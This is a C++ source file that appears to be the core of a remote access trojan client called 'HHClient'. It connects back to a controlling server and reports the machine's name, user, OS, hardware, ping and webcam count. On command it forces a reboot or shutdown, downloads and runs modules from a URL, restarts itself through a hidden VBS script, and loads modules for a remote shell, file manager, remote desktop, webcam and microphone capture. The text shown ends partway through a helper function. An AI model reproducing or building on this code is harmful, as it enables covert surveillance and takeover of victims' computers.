#include "Kernel.h"
#include "IOCPClient.h"
#include <time.h>
#include <dshow.h>
#include "MiniFileTrans.h"

#pragma comment(lib, "Strmiids.lib") 
CKernel::CKernel(DWORD Identity) :
CEventHandler(Identity)
{
}


CKernel::~CKernel()
{
}
/***********************************************************************/
void BeginDownload(char* szServerAddr,unsigned short uPort,DWORD dwParam);
void BeginFileTrans(char* szServerAddr,unsigned short uPort,DWORD dwParam);

/***********************************************************************/
void CKernel::OnConnect()
{
	
}
void CKernel::OnClose()
{
	//
	
}

void CKernel::OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffer)
{
	switch(Event)
	{
	case KNEL_READY:
		OnReady();				//Send Login infomation;
		break;
	case KNEL_POWER_REBOOT:
		OnPower_Reboot();
		break;
	case KNEL_POWER_SHUTDOWN:
		OnPower_Shutdown();
		break;

	case KNEL_EDITCOMMENT:
		OnEditComment((WCHAR*)Buffer);
		break;
	case KNEL_UPLOAD_MODULE_FROMDISK:
		OnUploadModuleFromDisk(dwRead,Buffer);
		break;
	case KNEL_UPLOAD_MODULE_FORMURL:
		OnUploadModuleFromUrl(dwRead,Buffer);
		break;
	case KNEL_CMD:
		OnCmd();
		break;
	case KNEL_CHAT:
		OnChat();
		break;
	case KNEL_FILEMGR:
		OnFileMgr();
		break;
	case KNEL_DESKTOP:
		OnRemoteDesktop();
		break;
	case KNEL_CAMERA:
		OnCamera();
		break;
	case KNEL_RESTART:
		OnRestart();
		break;
	case KNEL_MICROPHONE:
		OnMicrophone();
		break;
	}
}

/*******************************************************************************
			Get Ping
********************************************************************************/
/*
	TTL: time to live,最长生存时间,每经过一个节点,TTL-1,到0的时候丢弃.;
*/
/*
ping 请求:type 8,code 0;
ping 相应:type 0,code 0;
*/
//struct ip
//{
//	unsigned int hl : 4;		//header lenght;
//	unsigned int ver : 4;		//version;
//
//};

/*
检验和算法.;
两个字节为一个单位相加.;
若剩余一个字节,把最后一个字节加起来.;

若checksum 除去低16位之后不为0.右移16并且与低16位相加.;

返回~checksum;
*/

UINT16 CKernel::icmp_checksum(char*buff, int len)
{
	UINT64 checksum = 0;
	UINT64 Hi = 0;
	if (len & 1)
		checksum += buff[len - 1];
	len--;
	for (int i = 0; i < len; i += 2)
	{
		checksum += *(UINT16*)&buff[i];	//取两个字节相加.;
	}
	while ((Hi = (checksum >> 16)))
	{
		checksum = Hi + checksum & 0xFFFF;
	}
	return ~(checksum & 0xFFFF);
}
DWORD CKernel::GetPing(const char*host)
{
	struct MyIcmp
	{
		UINT8 m_type;			
		UINT8 m_code;
		UINT16 m_checksum;		//校验和算法;
		UINT16 m_id;			//唯一标识;
		UINT16 m_seq;			//序列号;
		DWORD  m_TickCount;		//
	};

	DWORD interval = -1;
	DWORD id = GetProcessId(NULL);
	DWORD TickCountSum = 0;
	DWORD SuccessCount = 0;
	//
	MyIcmp icmp_data = { 0 };
	char RecvBuf[128] = { 0 };

	SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (s == INVALID_SOCKET)
	{
		return interval;
	}
	//set recv time out;
	DWORD timeout = 3000;
	setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	//获取目标主机IP;
	sockaddr_in dest = { 0 };
	HOSTENT *p = gethostbyname(host);
	if (!p)
		goto Return;
	memcpy(&dest.sin_addr, p->h_addr_list[0], 4);
	dest.sin_family = AF_INET;
	
	//设置icmp头;
	icmp_data.m_type = 8;
	icmp_data.m_code = 0;
	icmp_data.m_id = id;//唯一标识;


	for(int i = 1;i<=4;i++)
	{
		icmp_data.m_seq = i;	//序列;
		icmp_data.m_checksum = 0;

		icmp_data.m_TickCount = GetTickCount();
		icmp_data.m_checksum = icmp_checksum((char*)&icmp_data, sizeof(icmp_data));
		//
		if (INVALID_SOCKET == sendto(s, (char*)&icmp_data, sizeof(icmp_data), 0, (sockaddr*)&dest, sizeof(dest)))
		{
			goto Return;
		}
		int namelen = sizeof(dest);
		int nRecv = recvfrom(s, RecvBuf, 128, 0, (sockaddr*)&dest, &namelen);
		if (INVALID_SOCKET == nRecv && WSAETIMEDOUT != WSAGetLastError())
		{
			goto Return;
		}
		//接受到了.IP头的第一个字节,低四位是HeaderLen,高四位是版本.;
		if ((RecvBuf[0] & 0xf0) == 0x40)//ipv4
		{
			//ipv4:
			DWORD IPHeaderLenght = (RecvBuf[0] & 0x0f) * 4;
			char*RecvIcmpData = RecvBuf + IPHeaderLenght;
			if (((MyIcmp*)RecvIcmpData)->m_id == id&&((MyIcmp*)RecvIcmpData)->m_seq == i)
			{
				//计算间隔.GetTickCount精度有点低,将就一下。;
				TickCountSum += GetTickCount() - ((MyIcmp*)RecvIcmpData)->m_TickCount;
				SuccessCount++;
				interval = TickCountSum/SuccessCount + 1;
			}
		}
	}
Return:
	closesocket(s);
	return interval;
}

/*******************************************************************************
				GetPrivateIP
********************************************************************************/
void CKernel::GetPrivateIP(WCHAR PrivateIP[128])
{
	PrivateIP[0] = L'-';
	PrivateIP[1] = 0;

	char IP[128] = {0};
	USHORT uPort = 0;
	GetSockName(IP,uPort);
	for(int i = 0;;i++)
	{
		PrivateIP[i] = IP[i];
		if(!PrivateIP[i])
			break;
	}
}

/*******************************************************************************
				GetCPU
********************************************************************************/
void CKernel::GetPCName(WCHAR PCName[128])
{
	DWORD BufferSize = 128;
	GetComputerName(PCName, &BufferSize);	
}
void CKernel::GetCurrentUser(WCHAR User[128])
{
	DWORD BufferSize = 128;
	GetUserName(User,&BufferSize);
}

WCHAR* MemUnits[] =
{
	L"Byte",
	L"KB",
	L"MB",
	L"GB",
	L"TB"
};
void CKernel::GetRAM(WCHAR RAMSize[128])
{
	
	MEMORYSTATUSEX MemoryStatu = { sizeof(MEMORYSTATUSEX) };
	ULONGLONG ullRAMSize = 0;
	if (GlobalMemoryStatusEx(&MemoryStatu))
	{
		ullRAMSize = MemoryStatu.ullTotalPhys;
	}
	int MemUnitIdx = 0;
	int MaxIdx = (sizeof(MemUnits) / sizeof(MemUnits[0])) - 1;
	while (ullRAMSize > 1024 && MemUnitIdx < MaxIdx)
	{
		MemUnitIdx++;
		ullRAMSize >>= 10;
	}
	DWORD dwRAMSize = (ullRAMSize&0xffffffff);
	++dwRAMSize;
	wsprintf(RAMSize, L"%u %s", dwRAMSize, MemUnits[MemUnitIdx]);
}

void CKernel::GetDisk(WCHAR szDiskSize[128])
{
	ULONGLONG ullDiskSize = 0;
	DWORD Drivers = GetLogicalDrives();
	WCHAR Name[] = L"A:\\";
	while (Drivers)
	{
		if (Drivers & 0x1)
		{
			DWORD Type = GetDriveType(Name);
			if (DRIVE_FIXED == Type)
			{
				ULARGE_INTEGER TotalAvailableBytes;
				ULARGE_INTEGER TotalBytes;
				ULARGE_INTEGER TotalFreeBytes;
				GetDiskFreeSpaceEx(Name, &TotalAvailableBytes, &TotalBytes, &TotalFreeBytes);
				ullDiskSize += TotalBytes.QuadPart;
			}
		}
		Name[0]++;
		Drivers >>= 1;
	}
	int MemUnitIdx = 0;
	int MaxIdx = (sizeof(MemUnits) / sizeof(MemUnits[0])) - 1;
	while (ullDiskSize > 1024 && MemUnitIdx < MaxIdx)
	{
		MemUnitIdx++;
		ullDiskSize >>= 10;
	}
	DWORD dwDiskSize = (ullDiskSize&0xFFFFFFFF);
	++dwDiskSize;
	wsprintf(szDiskSize, L"%u %s", dwDiskSize, MemUnits[MemUnitIdx]);
}

void CKernel::GetOSName(WCHAR OsName[128])
{
	HKEY hKey = 0;
	DWORD dwType = REG_SZ;
	DWORD dwSize = 255;
	WCHAR data[MAX_PATH] = { 0 };
	OsName[0] = 0;

	if (!RegOpenKey(HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hKey))
	{
		if (!RegQueryValueEx(hKey, L"ProductName", NULL, &dwType,(LPBYTE)data, &dwSize))
		{
			wcscpy(OsName,data);
		}
		RegCloseKey(hKey);
	}
	DWORD bit = 32;
	SYSTEM_INFO si = { sizeof(si) };
	//GetSystemInfo获取子系统版本.
	GetNativeSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		si.wProcessorArchitecture == PROCESSOR_AMD_X8664||
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
	{
		bit = 64;
	}
	WCHAR Bit[8] = { 0 };
	wsprintf(Bit, L" %d Bit", bit);
	wcscat(OsName, Bit);
}


void CKernel::GetCPU(WCHAR CPU[128])
{
	//0x80000002-->0x80000004
	char szName[64] = { 0 };
	__asm
	{
		xor esi,esi
		mov edi, 0x80000002
	getinfo:
		mov eax, edi
		add eax,esi
		cpuid
		shl esi,4
		mov dword ptr[szName + esi + 0], eax
		mov dword ptr[szName + esi + 4], ebx
		mov dword ptr[szName + esi + 8], ecx
		mov dword ptr[szName + esi + 12], edx
		shr esi,4
		inc esi
		cmp esi,3
		jb getinfo

		mov ecx, 0
		mov edi,[CPU]
	copyinfo:
		mov al,byte ptr[szName + ecx]
		mov byte ptr[edi + ecx*2], al
		inc ecx
		test al,al
		jne copyinfo
	}
	
}

DWORD CKernel::HasCamera()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化;
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备;
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器;
	//创建设备枚举管理器;
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID;
		NULL,                                                //表示Filter不被聚合;
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象;
		IID_ICreateDevEnum,                                  //获得的接口ID;
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针;
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口;
	//获取视频类的枚举器;
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码;
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位;
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针;
	while (hr = pEm->Next(1, &pM, &cFetched), hr == S_OK)       //获取下一个设备;
	{
		IPropertyBag *pBag;                                  //属性页接口指针;
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页;
		if (SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;                                //保存的是二进制数据;
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息;
			if (hr == NOERROR)
			{
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意;
			}
			pBag->Release();                  //释放属性页接口指针;
		}
		pM->Release();                        //释放监控器接口指针;
	}
	CoUninitialize();                   //卸载COM库;
	return nCam;
}

void CKernel::GetInstallDate(WCHAR InstallDate[128])
{
	HKEY hKey = NULL;
	//Open Key
	if(ERROR_SUCCESS !=RegCreateKey(HKEY_LOCAL_MACHINE,L"SOFTWARE\\HHClient",&hKey))
	{	
		wcscpy(InstallDate,L"-");
		return;
	}	
	DWORD cbBuffer = 128*sizeof(WCHAR);
	DWORD Type = 0;
	if(ERROR_SUCCESS!=RegQueryValueEx(hKey,L"InstallDate",0,&Type,(LPBYTE)InstallDate,&cbBuffer))
	{
		//Set key value;
		WCHAR CurDate[64] = {'U','n','k','n','o','w','n','\0'};
		time_t CurTime = time(NULL);
		tm*pLocalTime = localtime(&CurTime);

		if(pLocalTime)
		{
			wsprintf(CurDate,L"%d-%d-%d %d:%d:%d",pLocalTime->tm_year+1900,pLocalTime->tm_mon+1,
				pLocalTime->tm_mday,pLocalTime->tm_hour,pLocalTime->tm_min,
				pLocalTime->tm_sec);
		}
		if(ERROR_SUCCESS!=RegSetValueEx(hKey,L"InstallDate",0,REG_SZ,(BYTE*)CurDate,sizeof(WCHAR)*(wcslen(CurDate)+1)))
		{
			wcscpy(InstallDate,L"-");
			RegCloseKey(hKey);
			return;
		}
		wcscpy(InstallDate,CurDate);
	}
	RegCloseKey(hKey);
	return;
}

void CKernel::GetComment(WCHAR Comment[256])
{
	wcscpy(Comment,L"default");
	HKEY hKey = NULL;
	//Open Key
	if(ERROR_SUCCESS ==RegCreateKey(HKEY_LOCAL_MACHINE,L"SOFTWARE\\HHClient",&hKey))
	{	
		DWORD cbBuffer = 256 * sizeof(WCHAR);
		DWORD Type = 0;
		if(ERROR_SUCCESS==RegQueryValueEx(hKey,L"Comment",0,&Type,(LPBYTE)Comment,&cbBuffer))
		{
			//Get Comment Success;
			return;
		}
		RegCloseKey(hKey);
	}	
	return;
}

void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
{
	memset(pLoginInfo,0,sizeof(LoginInfo));
	//
	GetPrivateIP(pLoginInfo->PrivateIP);
	//
	GetPCName(pLoginInfo->HostName);
	//
	GetCurrentUser(pLoginInfo->User);
	//
	GetOSName(pLoginInfo->OsName);
	//
	GetInstallDate(pLoginInfo->InstallDate);
	//
	GetCPU(pLoginInfo->CPU);
	//
	GetDisk(pLoginInfo->Disk_RAM);
	wcscat(pLoginInfo->Disk_RAM,L"/");
	GetRAM(pLoginInfo->Disk_RAM + wcslen(pLoginInfo->Disk_RAM));
	//
	char host[64];
	USHORT Port;
	GetPeerName(host,Port);
	pLoginInfo->dwPing = GetPing(host);
	//
	pLoginInfo->dwHasCamera = HasCamera();
	GetComment(pLoginInfo->Comment);
}

void CKernel::OnPower_Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//获取进程标志
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	//获取关机特权的LUID
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,    &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//获取这个进程的关机特权
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS) 
		return;

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}
void CKernel::OnPower_Shutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//获取进程标志
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	//获取关机特权的LUID
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,    &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//获取这个进程的关机特权
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS) 
		return;

	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
}

void CKernel::OnReady()
{
	LoginInfo li;
	GetLoginInfo(&li);
	Send(KNEL_LOGIN,(char*)&li,sizeof(li));
}

void CKernel::OnEditComment(WCHAR NewComment[256])
{
	HKEY hKey = NULL;
	//Open Key
	if(ERROR_SUCCESS ==RegCreateKey(HKEY_LOCAL_MACHINE,L"SOFTWARE\\HHClient",&hKey))
	{	
		if(ERROR_SUCCESS==RegSetValueEx(hKey,L"Comment",0,REG_SZ,(BYTE*)NewComment,sizeof(WCHAR)*(wcslen(NewComment)+1)))
		{
			Send(KNEL_EDITCOMMENT_OK,(char*)NewComment,sizeof(WCHAR)*(wcslen(NewComment)+1));
			RegCloseKey(hKey);
			return;
		}
	}	
	return;
}

void CKernel::OnRestart()
{
	char szScript[4096] = {0};
	char szFileName[4096] = {0};

	DWORD dwPid = GetCurrentProcessId();
	GetModuleFileNameA(GetModuleHandle(NULL),szFileName,4095);
	
	sprintf(szScript,"set ws=wscript.createobject(\"wscript.shell\")\r\nws.run \"taskkill /pid %d /f \",0\r\nwscript.sleep 2000\r\nws.run \"\"\"%s\"\"\",0\r\n",dwPid,szFileName);

	FILE*fp = fopen("restart.vbs","wb");
	if(fp)
	{
		fwrite(szScript,1,strlen(szScript),fp);
		fclose(fp);
		ShellExecuteA(NULL,"open","restart.vbs","",NULL,SW_HIDE);
	}
}
void CKernel::RunModule(ModuleContext*pContext)
{
	if(!pContext)
		return;
	if(!pContext->m_pEntry)
		goto Failed;
	pContext->m_pEntry(pContext->szServerAddr,pContext->uPort,pContext->m_dwParam);

Failed:
	if(pContext->m_dwParam)
		free((void*)pContext->m_dwParam);
}

void CKernel::OnUploadModuleFromDisk(DWORD dwRead,char* Buffer)
{
	if(dwRead  != sizeof(WCHAR)*(wcslen((WCHAR*)Buffer) + 1))
		return;//Error .

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	//
	WCHAR CurDir[4096] = {0};
	GetModuleFileName(NULL,CurDir,4096);
	//Get Path
	WCHAR*p = CurDir + wcslen(CurDir) - 1;
	while(p>CurDir && p[0]!=L'\\' && p[0]!=L'/')
		p--;
	if(p[0]!=L'\\'&&p[0]!=L'/')			//invalid Path
		return;
	p[1] = 0;
	DWORD PathLen = (wcslen(CurDir) + wcslen(L"\\modules\\") + 1)*sizeof(WCHAR);
	
	CMiniFileTransInit*pInit = (CMiniFileTransInit*)malloc(sizeof(DWORD) + (PathLen + dwRead));
	pInit->m_dwDuty = MNFT_DUTY_RECEIVER;
	wcscpy(pInit->m_Buffer,CurDir);
	wcscat(pInit->m_Buffer,L"\\modules\\");
	wcscat(pInit->m_Buffer,L"\n");
	wcscat(pInit->m_Buffer,(WCHAR*)Buffer);
	//Get Init Data.
	pContext->m_dwParam = (DWORD)pInit;
	pContext->m_pEntry = BeginFileTrans;
	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,NULL,NULL);
	if(hThread != NULL)
		CloseHandle(hThread);
}


void CKernel::OnUploadModuleFromUrl(DWORD dwRead,char*Buffer)
{
	if(dwRead  != sizeof(WCHAR)*(wcslen((WCHAR*)Buffer) + 1))
		return;//Error .
	
	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);

	WCHAR CurDir[4096] = {0};
	GetModuleFileName(NULL,CurDir,4096);
	//Get Path
	WCHAR*p = CurDir + wcslen(CurDir) - 1;
	while(p>CurDir && p[0]!='\\' && p[0]!='/')
		p--;
	if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		return;
	p[1] = 0;

	WCHAR*pInit = (WCHAR*)malloc((wcslen(CurDir) + wcslen(L"\\modules\\") + 1)*sizeof(WCHAR) + dwRead);
	wcscpy(pInit,CurDir);
	wcscat(pInit,L"\\modules\\");
	wcscat(pInit,L"\n");
	wcscat(pInit,(WCHAR*)Buffer);
	//Get Init Data.
	pContext->m_pEntry = BeginDownload;
	pContext->m_dwParam = (DWORD)pInit;
	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,NULL,NULL);
	if(hThread != NULL)
		CloseHandle(hThread);
}

void CKernel::OnCmd()
{
	static pModuleEntry pCmd = NULL;
	WCHAR* szError = NULL;
	if(pCmd == NULL)
	{
		//加载模块;
		WCHAR DllName[4096] = {0};
		GetModuleFileName(NULL,DllName,4096);
		WCHAR*p = DllName + wcslen(DllName) - 1;
		while(p>DllName && p[0]!='\\' && p[0]!='/')
			p--;
		if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		{
			szError = L"cmd.dll not found!";
			goto Failed;
		}
		p[1] = 0;
		wcscat(DllName,L"\\modules\\cmd.dll");
		HMODULE hCmdDll = NULL;
		if(NULL == (hCmdDll = LoadLibrary(DllName)) || 
			(pCmd = (pModuleEntry)GetProcAddress(hCmdDll,"HHBeginCmd")) == NULL)
		{
			szError = L"cmd.dll not found!";
			goto Failed;
		}	
	}

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	pContext->m_pEntry = pCmd;

	HANDLE hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,0,0);
	if(hThread)
	{
		CloseHandle(hThread);
	}
	return;
Failed:
	Send(KNEL_MODULE_NOT_FOUND,(char*)szError,sizeof(WCHAR)*(wcslen(szError)+1));
	return;
}

void CKernel::OnChat()
{
	static pModuleEntry pChat = NULL;
	WCHAR* szError = NULL;
	if(pChat == NULL)
	{
		//加载模块;
		WCHAR DllName[4096] = {0};
		GetModuleFileName(NULL,DllName,4096);
		WCHAR*p = DllName + wcslen(DllName) - 1;
		while(p>DllName && p[0]!='\\' && p[0]!='/')
			p--;
		if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		{
			szError = L"chat.dll not found!";
			goto Failed;
		}
		p[1] = 0;
		wcscat(DllName,L"\\modules\\chat.dll");
		HMODULE hChatModule = NULL;
		if(NULL == (hChatModule = LoadLibrary(DllName)) || 
			(pChat = (pModuleEntry)GetProcAddress(hChatModule,"HHBeginChat")) == NULL)
		{
			szError = L"chat.dll not found!";
			goto Failed;
		}	
	}

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	pContext->m_pEntry = pChat;

	HANDLE hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,0,0);
	if(hThread)
	{
		CloseHandle(hThread);
	}
	return;
Failed:
	Send(KNEL_MODULE_NOT_FOUND,(char*)szError,sizeof(WCHAR)*(wcslen(szError)+1));
	return;
}

void CKernel::OnFileMgr()
{
	static pModuleEntry pFileMgr = NULL;
	WCHAR* szError = NULL;
	if(pFileMgr == NULL)
	{
		//加载模块;
		WCHAR DllName[4096] = {0};
		GetModuleFileName(NULL,DllName,4096);
		WCHAR*p = DllName + wcslen(DllName) - 1;
		while(p>DllName && p[0]!='\\' && p[0]!='/')
			p--;
		if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		{
			szError = L"filemgr.dll not found!";
			goto Failed;
		}
		p[1] = 0;
		wcscat(DllName,L"\\modules\\filemgr.dll");
		HMODULE hFileMgr = NULL;
		if(NULL == (hFileMgr = LoadLibrary(DllName)) || 
			(pFileMgr = (pModuleEntry)GetProcAddress(hFileMgr,"HHBeginFileMgr")) == NULL)
		{
			szError = L"filemgr.dll not found!";
			goto Failed;
		}	
	}

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	pContext->m_pEntry = pFileMgr;

	HANDLE hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,0,0);
	if(hThread)
	{
		CloseHandle(hThread);
	}
	return;
Failed:
	Send(KNEL_MODULE_NOT_FOUND,(char*)szError,sizeof(WCHAR)*(wcslen(szError)+1));
	return;
}

void CKernel::OnRemoteDesktop()
{
	static pModuleEntry pRemoteDesktop = NULL;
	WCHAR* szError = NULL;
	if(pRemoteDesktop == NULL)
	{
		//加载模块;
		WCHAR ExeModuleName[4096] = {0};
		WCHAR DllsName[4096] = {0};
		GetModuleFileName(NULL,ExeModuleName,4096);
		WCHAR*p = ExeModuleName + wcslen(ExeModuleName) - 1;
		while(p>ExeModuleName && p[0]!='\\' && p[0]!='/')
			p--;
		if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		{
			szError = L"Invalid Module File Name!";
			goto Failed;
		}
		p[1] = 0;
		//msvcr120.dll
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\msvcr120.dll");
		if(LoadLibrary(DllsName) == NULL)
		{
			szError = L"msvcr120.dll not found!";
			goto Failed;
		}
		//libx264-163.dll;
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\libx264-163.dll");
		if(LoadLibrary(DllsName) == NULL)
		{
			szError = L"libx264-163.dll not found!";
			goto Failed;
		}
		//Main Module. RemoteDesktop.dll
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\RemoteDesktop.dll");
		HMODULE hRemoteDesktop = NULL;
		if(NULL == (hRemoteDesktop = LoadLibrary(DllsName)) || 
			(pRemoteDesktop = (pModuleEntry)GetProcAddress(hRemoteDesktop,"HHBeginDesktop")) == NULL)
		{
			szError = L"RemoteDesktop.dll not found!";
			goto Failed;
		}	
	}

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	pContext->m_pEntry = pRemoteDesktop;

	HANDLE hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,0,0);
	if(hThread)
	{
		CloseHandle(hThread);
	}
	return;
Failed:
	Send(KNEL_MODULE_NOT_FOUND,(char*)szError,sizeof(WCHAR)*(wcslen(szError)+1));
	return;
}


void CKernel::OnMicrophone()
{
	static pModuleEntry pMicrophone = NULL;
	WCHAR* szError = NULL;
	if(pMicrophone == NULL)
	{
		//加载模块;
		WCHAR ExeModuleName[4096] = {0};
		WCHAR DllsName[4096] = {0};
		GetModuleFileName(NULL,ExeModuleName,4096);
		WCHAR*p = ExeModuleName + wcslen(ExeModuleName) - 1;
		while(p>ExeModuleName && p[0]!='\\' && p[0]!='/')
			p--;
		if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		{
			szError = L"Invalid Module File Name!";
			goto Failed;
		}
		p[1] = 0;
		//Main Module. MiconPhone.dll
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\Microphone.dll");
		HMODULE hMicrophone = NULL;
		if(NULL == (hMicrophone = LoadLibrary(DllsName)) || 
			(pMicrophone = (pModuleEntry)GetProcAddress(hMicrophone,"HHBeginMicrophone")) == NULL)
		{
			szError = L"Microphone.dll not found!";
			goto Failed;
		}	
	}

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	pContext->m_pEntry = pMicrophone;

	HANDLE hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,0,0);
	if(hThread)
	{
		CloseHandle(hThread);
	}
	return;
Failed:
	Send(KNEL_MODULE_NOT_FOUND,(char*)szError,sizeof(WCHAR)*(wcslen(szError)+1));
	return;

}
void CKernel::OnCamera()
{
	static pModuleEntry pCamera = NULL;
	WCHAR* szError = NULL;
	if(pCamera == NULL)
	{
		//加载模块;
		WCHAR ExeModuleName[4096] = {0};
		WCHAR DllsName[4096] = {0};
		GetModuleFileName(NULL,ExeModuleName,4096);
		WCHAR*p = ExeModuleName + wcslen(ExeModuleName) - 1;
		while(p>ExeModuleName && p[0]!='\\' && p[0]!='/')
			p--;
		if(p[0]!='\\'&&p[0]!='/')			//invalid Path
		{
			szError = L"Invalid Module File Name!";
			goto Failed;
		}
		p[1] = 0;
		//msvcr120.dll
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\msvcr120.dll");
		if(LoadLibrary(DllsName) == NULL)
		{
			szError = L"msvcr120.dll not found!";
			goto Failed;
		}
		//libx264-163.dll;
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\libx264-163.dll");
		if(LoadLibrary(DllsName) == NULL)
		{
			szError = L"libx264-163.dll not found!";
			goto Failed;
		}
		//Main Module. RemoteDesktop.dll
		wcscpy(DllsName,ExeModuleName);
		wcscat(DllsName,L"\\modules\\Camera.dll");
		HMODULE hCamera = NULL;
		if(NULL == (hCamera = LoadLibrary(DllsName)) || 
			(pCamera = (pModuleEntry)GetProcAddress(hCamera,"HHBeginCamera")) == NULL)
		{
			szError = L"Camera.dll not found!";
			goto Failed;
		}	
	}

	ModuleContext*pContext = (ModuleContext*)malloc(sizeof(ModuleContext));
	memset(pContext,0,sizeof(ModuleContext));
	//Copy Server Info
	GetSrvName(pContext->szServerAddr,pContext->uPort);
	pContext->m_pEntry = pCamera;

	HANDLE hThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RunModule,(LPVOID)pContext,0,0);
	if(hThread)
	{
		CloseHandle(hThread);
	}
	return;
Failed:
	Send(KNEL_MODULE_NOT_FOUND,(char*)szError,sizeof(WCHAR)*(wcslen(szError)+1));
	return;

}
/**************************Kernel Module Entry*******************************/
void BeginKernel(char* szServerAddr,unsigned short uPort,DWORD dwParam)
{
	CIOCPClient::SocketInit();
	//
	CIOCPClient Client(szServerAddr,uPort, TRUE,-1,10);
	CKernel Handler(KNEL);

	Client.BindHandler(&Handler);

	Client.Run();

	Client.UnbindHandler();

	CIOCPClient::SocketTerm();
}

/*******************************************************************
				*		Other			*
*******************************************************************/
BOOL MakesureDirExist(const WCHAR* Path,BOOL bIncludeFileName = FALSE)
{
